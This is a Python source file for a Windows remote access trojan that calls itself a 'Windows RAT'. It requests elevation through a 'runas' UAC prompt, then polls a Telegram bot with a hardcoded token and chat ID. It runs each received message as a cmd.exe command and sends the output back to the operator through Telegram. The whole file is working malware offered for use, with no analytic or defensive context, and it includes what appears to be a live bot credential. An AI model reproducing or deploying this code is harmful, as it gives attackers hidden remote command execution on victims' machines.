#!/usr/bin/env python3
import subprocess, requests, time, os, sys, ctypes

BOT_TOKEN = "8944422318:AAHsZLIpI8m3I_CpTYixnvcTRniLa-Aj6aQ"
CHAT_ID = "1712121064"
POLL_INTERVAL = 5

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
last_update_id = None

def send_message(text):
    try:
        requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": CHAT_ID, "text": text}, timeout=5)
    except: pass

def get_updates(offset=None):
    try:
        r = requests.get(f"{BASE_URL}/getUpdates", params={"timeout": 30, "offset": offset}, timeout=35)
        return r.json().get("result", [])
    except: return []

def execute_command(cmd):
    full = f"cmd.exe /c {cmd}"
    try:
        res = subprocess.run(full, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=30)
        out = res.stdout
        if res.returncode != 0:
            out = f"Return code {res.returncode}\n{out}"
        return out
    except subprocess.TimeoutExpired:
        return "Timeout"
    except Exception as e:
        return f"Error: {e}"

def main():
    global last_update_id
    send_message("[✅] Windows RAT active (Admin).")
    while True:
        updates = get_updates(last_update_id)
        for up in updates:
            last_update_id = up["update_id"] + 1
            if "message" in up and "text" in up["message"]:
                cmd = up["message"]["text"].strip()
                if cmd.lower() == "exit":
                    send_message("[⛔] Exiting.")
                    sys.exit(0)
                elif cmd.lower().startswith("cd "):
                    try:
                        os.chdir(cmd[3:].strip())
                        send_message(f"[OK] Changed to: {os.getcwd()}")
                    except Exception as e:
                        send_message(f"[ERROR] cd failed: {e}")
                else:
                    out = execute_command(cmd)
                    if len(out) > 4000:
                        for i in range(0, len(out), 4000):
                            send_message(out[i:i+4000])
                    else:
                        send_message(out)
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    main()
